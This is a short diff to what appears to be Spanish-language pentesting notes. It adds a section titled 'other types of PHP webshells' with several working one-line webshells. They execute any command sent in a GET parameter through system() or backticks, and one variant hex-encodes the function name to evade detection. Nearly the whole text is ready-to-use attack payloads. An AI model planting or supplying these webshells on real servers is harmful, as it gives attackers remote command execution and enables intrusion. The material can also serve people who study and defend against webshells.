@@ -9,6 +9,21 @@
 	<?php
 		system($_GET['cmd']);
 	?>
-==webshell super acortada:==
+**Otro tipo de webshells en php:**
+
+```php
 <?=`$_GET[0]`?>
 
+<?php
+	$c=$_GET['cmd'];
+	 echo `$c`;
+?>
+
+<?php
+	"system"("id");
+?>
+
+<?php
+	"\x73\x79\x73\x74\x65\x6d"($_GET['cmd']);
+?>
+```
